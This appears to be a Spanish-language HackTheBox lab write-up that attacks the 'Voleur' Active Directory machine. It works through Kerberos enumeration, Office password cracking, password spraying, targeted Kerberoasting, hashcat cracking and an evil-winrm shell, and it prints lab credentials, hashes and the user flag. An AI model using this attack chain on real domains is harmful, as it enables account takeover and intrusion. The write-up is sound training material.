# HTB: Voleur

## Host: windows
## IP: 10.10.11.76

## Procedimiento y comandos

**Credenciales**

user:**ryan.naylor**
pass:**HollowOct31Nyt**

#### Paso 1: Enumeracion

* Nmap

```bash
nmap -A -p- -T4 -Pn -oX voleur_tcp.scan 10.10.11.76 --webxml 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 21:56 -03
Nmap scan report for 10.10.11.76
Host is up (0.19s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-19 09:03:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
61495/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61496/tcp open  msrpc         Microsoft Windows RPC
61508/tcp open  msrpc         Microsoft Windows RPC
61513/tcp open  msrpc         Microsoft Windows RPC
61526/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m00s
| smb2-time: 
|   date: 2025-09-19T09:03:58
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   240.74 ms 10.10.14.1
2   241.03 ms 10.10.11.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 501.99 seconds
```

* FFuF

```bash

```

* SMB

```bash
nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares    
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
```

* SMB: verbose + kerberos: 
```bash
nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares -k --verbose
[19:24:37] INFO     Socket info: host=voleur.htb, hostname=voleur.htb, kerberos=True, ipv6=False, link-local ipv6=False        connection.py:165
           INFO     Creating SMBv3 connection to voleur.htb                                                                           smb.py:606
[19:24:39] INFO     Creating SMBv1 connection to voleur.htb                                                                           smb.py:575
[19:24:40] INFO     SMBv1 disabled on voleur.htb                                                                                      smb.py:598
           INFO     Error resolving hostname htb: [Errno -2] Name or service not known                                         connection.py:192
           INFO     Resolved domain: htb with dns, kdcHost: None                                                                      smb.py:321
SMB         voleur.htb      445    voleur           [*]  x64 (name:voleur) (domain:htb) (signing:True) (SMBv1:False) (NTLM:False)
           INFO     Creating SMBv3 connection to voleur.htb                                                                           smb.py:606
SMB         voleur.htb      445    voleur           [-] htb\ryan.naylor:HollowOct31Nyt [Errno Connection error (HTB:88)] [Errno -2] Name or service not known
```

Luego de intentar enumerar smb obtuvimos varios errores parece ser que la autenticacion por NTLM en SMB no esta habilitada, y debemos hacerlo con kerberos, 
buscamos en la [documentacion de netexec](https://www.netexec.wiki/smb-protocol/generate-krb5.conf-file):

Confirmamos cambiando el protocolo y agregando -k

* LDAP

```bash
nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k        
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```

* LDAP users: 

```bash
nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        voleur.htb      389    DC               [*] Enumerated 11 domain users: voleur.htb
LDAP        voleur.htb      389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        voleur.htb      389    DC               Administrator                 2025-01-28 17:35:13 3        Built-in account for administering the computer/domain
LDAP        voleur.htb      389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        voleur.htb      389    DC               krbtgt                        2025-01-29 05:43:06 0        Key Distribution Center Service Account
LDAP        voleur.htb      389    DC               ryan.naylor                   2025-01-29 06:26:46 0        First-Line Support Technician
LDAP        voleur.htb      389    DC               marie.bryant                  2025-01-29 06:21:07 1        First-Line Support Technician
LDAP        voleur.htb      389    DC               lacey.miller                  2025-01-29 06:20:10 1        Second-Line Support Technician
LDAP        voleur.htb      389    DC               svc_ldap                      2025-01-29 06:20:54 1  
LDAP        voleur.htb      389    DC               svc_backup                    2025-01-29 06:20:36 1  
LDAP        voleur.htb      389    DC               svc_iis                       2025-01-29 06:20:45 1  
LDAP        voleur.htb      389    DC               jeremy.combs                  2025-01-29 12:10:32 1        Third-Line Support Technician
LDAP        voleur.htb      389    DC               svc_winrm                     2025-01-31 06:10:12 1 
```

Debemos configurar kerberos en nuestra maquina para poder autenticarnos cn las credenciales de ryan.

> Insalamos dependencias `sudo apt install krb5-user` [docs](https://web.mit.edu/kerberos/krb5-latest/doc/user/index.html)

1. Debemos modificar nuestro archivo krb5.conf:

```bash
nano /etc/krb5.conf
```
Agregamos las siguientes variables al archivo: Comentar variables innecesarias y seguir nomenclatura del archivo.

```bash
[libdefaults]   
        default_realm = VOLEUR.HTB

[realms]
        VOLEUR.HTB = {
                kdc = DC.VOLEUR.HTB
                admin_server = DC.VOLEUR.HTB
        }
```

2. Obtenemos tickets con kinit

```bash
kinit ryan.naylor
Password for ryan.naylor@VOLEUR.HTB: HollowOct31Nyt
```

3. Listamos tickets:

```bash
klist            
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
09/19/2025 20:09:47  09/20/2025 06:09:47  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/20/2025 20:09:20
```

4. Volvemos a enumerar SMB pero con el nombre de host del DC.. dc.voleur.htb

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```

* SMBCLIENT

```bash
smbclient -L //dc.voleur.htb/ -U 'ryan.naylor'%'HollowOct31Nyt' -k
WARNING: The option -k|--kerberos is deprecated!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Finance         Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to dc.voleur.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

* Indagamos en IT:

```bash
smbclient //dc.voleur.htb/IT -U 'ryan.naylor'%'HollowOct31Nyt' -k
WARNING: The option -k|--kerberos is deprecated!
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 06:10:01 2025
  ..                                DHS        0  Thu Jul 24 17:09:59 2025
  First-Line Support                  D        0  Wed Jan 29 06:40:17 2025

                5311743 blocks of size 4096. 984133 blocks available
smb: \> cd "First-Line Support"
smb: \First-Line Support\> dir
  .                                   D        0  Wed Jan 29 06:40:17 2025
  ..                                  D        0  Wed Jan 29 06:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 11:14:25 2025

                5311743 blocks of size 4096. 984133 blocks available                                                                                   
smb: \First-Line Support\> get Access_Review.xlsx
getting file \First-Line Support\Access_Review.xlsx of size 16896 as Access_Review.xlsx (13.9 KiloBytes/sec) (average 13.9 KiloBytes/sec)              
smb: \First-Line Support\> 
```

* Una vez descargado el arvhio intentamos abrirlo con libreoffice pero requerimos un password para hacerlo:


1. Generamos el hash del arcvhio:

```bash
office2john Access_Review.xlsx > Access_Review.hash
```

2. Lo crackeamos: 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt Access_Review.hash 
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 512/512 AVX512BW 16x / SHA512 512/512 AVX512BW 8x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:03 DONE (2025-09-19 21:00) 0.2985g/s 267.4p/s 267.4c/s 267.4C/s football1..ilovegod
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

* Extraemos del archivo todo lo que sea potencialmente un password.. y enumeramos ldap nuevamente

```bash
nxc ldap voleur.htb -u users.txt  -p pass.txt -k --continue-on-success
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        voleur.htb      389    DC               [-] voleur.htb\Administrator:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\marie.bryant:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\lacey.miller:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_ldap:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_backup:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_iis:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\jeremy.combs:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_winrm:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\Administrator:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\marie.bryant:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\lacey.miller:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_ldap:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_backup:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_iis:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\jeremy.combs:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_winrm:football1 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\Administrator:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\marie.bryant:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\lacey.miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_backup:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_iis:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\jeremy.combs:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_winrm:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\Administrator:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\marie.bryant:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\lacey.miller:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 
LDAP        voleur.htb      389    DC               [-] voleur.htb\jeremy.combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\Administrator:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\marie.bryant:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\lacey.miller:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_backup:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\jeremy.combs:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_winrm:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\Administrator: KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\marie.bryant: KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\lacey.miller: KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_backup: KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\jeremy.combs: KDC_ERR_PREAUTH_FAILED
LDAP        voleur.htb      389    DC               [-] voleur.htb\svc_winrm: KDC_ERR_PREAUTH_FAILED

```

* Conseguimos dos matches:

```bash
LDAP        voleur.htb      389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
LDAP        voleur.htb      389    DC               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8
```

* Como bloodhound-python daba error cuando no teniamos configurado krb5.conf podemos volver a ejecutar:

```bash
bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -dc dc.voleur.htb -d voleur.htb -ns 10.10.11.76 -c all --zip
```

Explorando los resultados de bloodhound vemos que:

```bash
		      __ WriteSPN --> SVC_WINRM@VOLEUR.HTB
                     /  
	            /
SVC_LDAP@VOLEUR.HTB 						   __ GenericWrite --> SECOND-LINE SUPORT TECHNICANS@
                    \						  /	
                     \__ MemberOf --> RESTORE_USERS@VOLEUR.HTB __/ 		   
								 \	
								  \__ GenericWrite --> LACEY.MILLER@VOLEUR.HTB
```

* Procedemos con impacket:

1. Obtenemos el TGT

```bash
impacket-getTGT voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn'                                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
```

2. Exportamos el TGT:

```bash
export KRB5CCNAME=svc_ldap.ccache
```
3. Usamos targetedKerberoast.py:

```bash
/home/kali/HTB/TombWatcher/targetedKerberoast/targetedKerberoast.py -d "voleur.htb" -k --no-pass --dc-host dc.voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$ba03de3387b3571e0969899ec5c43ac0$9f8e64554db4992edaa8862aa4cf696924bccbcef064fc5706d21949656087f9f862ac402cf6e2987974e2bcf4cca095bfee36ffe48f461c07b1267af04112f569ea9479d71fb0a5b2bb1bcf67aad25d7a890cf330547584c3a35d20c2c1391f2def1ffc0d9171770ee5a8a6d7356e1f481ef0a078199ae50aee3ec7287686e8a38ac3f5994f97de30f46e7c9e8695601d7aea51404d2efb976dcbbc0f07c84baab132fde0bf8c104c138c9380e5509074697b6153ab922007786c83ab4c54dd1a958b18d096f61327d1c1e9a4f45f14a0ff4086ba5f682f2cfb86bb6ffe863e0dbdbd0baa3d449db452ede12fd627debda47374ce09e3a82a2cb4d49b450a4c39057f21039c156dbb04ad0deb2ce35967ce9d21d3667756952421b6d9c7f219166727200b26f9bd6a9d6b5ead792bcd7fb2c5a78f0c98baa7b45a546cf9666fe98ab0f10c2ebfd23ee7d06baf22f85e5e09fafd6ee023e4dc636e6b1394c5a6c42214cb379cb451a1ca2ecb943038b0cfe750edcb83f9a01df197186e8beaf0572226891fc6411070fa13ec921577605c4e28a49280386a4c74cebc7e98326b66a02f2f9d9ca6dfc5b3269209bafbe3b51d6dfa55e8c6cabd948aabcc4d25104a4d9a1c096c3550f629f1f906c2bf19f7d1d1c0715e02acbad7606c7c83b9939276dbf690ff0cc4416bc8bdc23a96d6d1dc4466a469fb0b46488e15450cd9b0377c002b34b538976423b71214d9269ffdcb07ad4dd4cb0defdb63a723590f15db6989840407063e0b457c857a7b45dcf75f2fa541f16179677013085ee193abcef249814edcacd5772718a3a9b3b324b30e33a6e8c53525d38bae834af147c85d34e5b5d329895b9951a3b754bc9864e7cd43f07532e5314b476321c343d431d34d2c0b8e3f7da7d641be8bf5c0dc8624cd13b3c3974fb14aed9198c2d8341df924dd4dfc7f53c32592ef2bf71e2948e5344b32afd4fc24df196c2af0f3d7acfb9ae0a71657d5e7ee98ca914c924e99d5fe09de591b7a2dfb85876bb01d9d3f8b0473d58b3cb82bea1aa5d5a251448d90d6429b11a0e7fd5855165436461efa9ad6f440a562f724ee4bfd3198f82c8ace97285c08293704923eb398081429a75da47f1eab34a89512318cb72c06c7f0deb2f532fbae9d9cbb3a196c0e58f6ad18b7c37c31aa44169455497bde6e4918a3008cb046367d058ee05de895f1a3176adde8cf13c8073499221760b00a177cc2db78971d008cc6801431dc77c5b3d05a2d279ff84627436567187eb668990701939c89d8ab4f47e1a6ce4abc686d2947f651bf4c439dbf1891ebe40601206d64a8360d42d89b548ed921cd7149138962206e03d0cc5ddcdcd15f5c7ca7692f48bcd4dfc445ddd9bdbea82a271f2460516711024d3280e0a4d36e6525f0eb6e146c1edf7a879566856064e7bcf8ee6aaca4132cd716de0d759d3c65f8b8755456b488
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$4715eb02d4e90d888f4392a3e1492495$bf01050a3b9f879a645b6aedc7b3577f4f5945e474ac56919438a3d9162213623a415519bd14e9b84c6c3efd1ca6cde17c9005fff5636760fa76dd6c7c590eec7898c50dba59ef8181a79186d41217235b78df3ddd2021e26383d5b077b1955e61eb625f145d905290070a9c6844073811f2f0c2da9f1f5797fce946d7a61eb5a68c345a60297d9ec2f8aa70ee910fac8d98076d71c8c63fd766958000d24a55fb90f7f8f7a8488738ffa777b2e449911cb67dd2310cce8b4954ed259474523926e0a31913f7e57f1e12a3fb75b0fc179e8e43163d584ba13d1c45527d8ed2fe0c0ad8a210f706a7284a112e6ad12941036c398427dc2a0b9f506e6000c1518a003a6bae00dc28decef166b51dcddd7a3742350bec2b85b190a67d0bdf7a55281f962a3319e774d4752f46b1da17113a0fb2014cebfe6fed0903d25e8eff7c52cabdc365c8c4e5d84e8c05d29793820296bdc9660aba05d2f1dba2ea0cee0624e7ea40d9c2f092aab79680c6aa39f7a59305d42790ecc584bc705dfb920757c3adcd67175dc47041ee17d380dfafb2eb84abde7b7953cfc283387b84412403f6c3267ea7da8f538629eaa34a1f40cc02a13f1a8670a71d027d662fe65019f7d2555fc3650cfec0e2dc7940e7ef29be0ffa4e68be6da609109c888518fe3ac0285f4f22360f6bfa8dee2f93a592a414fb2b2c32cecfc7540ca1c40cefe921175f143645cc890309750ba87cfc940de1645789d359551b31239f61770f3e9d1cbe4a6a88f97c9b903f1a28e8ff175c4ec40173f3c8fb8b2d333d0e54e2d164ec31e228649c9d3c0444ed9eff43647efde1960d4617769b73a97b3319ab74c1ee4c76a80ceb6044e2791a676e469a764fc747271c57f7bc9ebd9eaec52789d48ba8d6f2549d83f5f076c95f9f31f02054ed7fd5c4b1368ca33558a269557f99053a371225249d204c731bc4f2bca1c93edab574c0b5bc925f5b0e54f745188e59440eadcdd8423e7ddf51a48b24eb80066cff75fd9855eaa2ab03a0263725519cc621d7397e16258d1a17b57eba69bcb32e972e316ec0d745bbcd36d030340480a049777e8dcf7aa7c6b9204d175603b86f2db8146246b09caddcb2b9c536fc22a1e410ebabbf2827fcc8a9bf150f322a4c099ff554d8a916c5be0e596a71933a738243721f369b23e75ed2399ccd688a889c82f20b64c7b7e43da8e40dd1faecd50c6b95a608896f2fbf1347b44d727a2bda8c4563a56619c7842ceece94a93d07842cd8af170a763c8f17be88f16a70404b7f34120be08e6ef2ae09fd2df3aff170bf5704afa2ef4cc4ce2043d982e469c0594a28761982a286a17562e2cf1fa80e20037a3073c4f69210ade6a08b346b8ba510a812f250085cdf08ea891dd39a103c3f81b9f6de8b6a028d2f6d95190710e21fe26ef360e3a2e2e7448b792506906ab150588dc290f6ef8690af6d42ce9e6971
```

* Crackeamos los hashes:

1. Buscamos modulo
```bash
hashcat -h | grep -i "kerberos"                             
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

2. TGS-REP es este caso en particular, guardamos cada hash en archivos separados y crackeamos el hash svc_winrm primero:

```bash
hashcat -m 13100 svc_winrm-hash.txt /usr/share/wordlists/rockyou.txt 

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$4715eb02d4e90d888f4392a3e1492495$bf01050a3b9f879a645b6aedc7b3577f4f5945e474ac56919438a3d9162213623a415519bd14e9b84c6c3efd1ca6cde17c9005fff5636760fa76dd6c7c590eec7898c50dba59ef8181a79186d41217235b78df3ddd2021e26383d5b077b1955e61eb625f145d905290070a9c6844073811f2f0c2da9f1f5797fce946d7a61eb5a68c345a60297d9ec2f8aa70ee910fac8d98076d71c8c63fd766958000d24a55fb90f7f8f7a8488738ffa777b2e449911cb67dd2310cce8b4954ed259474523926e0a31913f7e57f1e12a3fb75b0fc179e8e43163d584ba13d1c45527d8ed2fe0c0ad8a210f706a7284a112e6ad12941036c398427dc2a0b9f506e6000c1518a003a6bae00dc28decef166b51dcddd7a3742350bec2b85b190a67d0bdf7a55281f962a3319e774d4752f46b1da17113a0fb2014cebfe6fed0903d25e8eff7c52cabdc365c8c4e5d84e8c05d29793820296bdc9660aba05d2f1dba2ea0cee0624e7ea40d9c2f092aab79680c6aa39f7a59305d42790ecc584bc705dfb920757c3adcd67175dc47041ee17d380dfafb2eb84abde7b7953cfc283387b84412403f6c3267ea7da8f538629eaa34a1f40cc02a13f1a8670a71d027d662fe65019f7d2555fc3650cfec0e2dc7940e7ef29be0ffa4e68be6da609109c888518fe3ac0285f4f22360f6bfa8dee2f93a592a414fb2b2c32cecfc7540ca1c40cefe921175f143645cc890309750ba87cfc940de1645789d359551b31239f61770f3e9d1cbe4a6a88f97c9b903f1a28e8ff175c4ec40173f3c8fb8b2d333d0e54e2d164ec31e228649c9d3c0444ed9eff43647efde1960d4617769b73a97b3319ab74c1ee4c76a80ceb6044e2791a676e469a764fc747271c57f7bc9ebd9eaec52789d48ba8d6f2549d83f5f076c95f9f31f02054ed7fd5c4b1368ca33558a269557f99053a371225249d204c731bc4f2bca1c93edab574c0b5bc925f5b0e54f745188e59440eadcdd8423e7ddf51a48b24eb80066cff75fd9855eaa2ab03a0263725519cc621d7397e16258d1a17b57eba69bcb32e972e316ec0d745bbcd36d030340480a049777e8dcf7aa7c6b9204d175603b86f2db8146246b09caddcb2b9c536fc22a1e410ebabbf2827fcc8a9bf150f322a4c099ff554d8a916c5be0e596a71933a738243721f369b23e75ed2399ccd688a889c82f20b64c7b7e43da8e40dd1faecd50c6b95a608896f2fbf1347b44d727a2bda8c4563a56619c7842ceece94a93d07842cd8af170a763c8f17be88f16a70404b7f34120be08e6ef2ae09fd2df3aff170bf5704afa2ef4cc4ce2043d982e469c0594a28761982a286a17562e2cf1fa80e20037a3073c4f69210ade6a08b346b8ba510a812f250085cdf08ea891dd39a103c3f81b9f6de8b6a028d2f6d95190710e21fe26ef360e3a2e2e7448b792506906ab150588dc290f6ef8690af6d42ce9e6971:AFireInsidedeOzarctica980219afi                                                                                                         
                                                                                                                                        
Session..........: hashcat                                                                                                              
Status...........: Cracked                                                                                                              
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)                                                                                
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...9e6971                                                         
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                                              

```

Obtenemos **AFireInsidedeOzarctica980219afi** y para generar un login por evil-winrm debemos solicitar un ticket con estas credenciales y guardarlo

1. 
```bash
impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```
2. 

```bash
export KRB5CCNAME=svc_winrm.ccache
```

3. 

```bash
klist
Ticket cache: FILE:svc_winrm.ccache
Default principal: svc_winrm@VOLEUR.HTB

Valid starting       Expires              Service principal
09/19/2025 23:24:21  09/20/2025 09:24:21  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/20/2025 23:24:20

```

4. 

```bash
evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
    Directory: C:\Users\svc_winrm\Desktop                                                                                                                                                                                                   
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Mode                 LastWriteTime         Length Name                                                                                                                                                                                      
----                 -------------         ------ ----                                                                                                                                                                                      
-ar---         9/19/2025   6:31 PM             34 user.txt                                                                                                                                                                                  
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> type C:\Users\svc_winrm\Desktop\user.txt
891dfcf30923039a6d8f6ed9adcdbb1c 
```

#### Paso 2: Acceso inicial / Exfiltrar datos

Analizando la primer salida que obtuvimos de bloodhound + el excel que obtuvimos podemos inferir lo siguiente:

svc_ldap user es miembro de RESTORE_USERS y existe un usuario eliminado e inactivo con credenciales:** todd.wolfe / NightT1meP1dg3on14 **
lo cual le da la potestad a svc_ldap de restaurar a todd.wolfe y ver a donde este nos lleva.

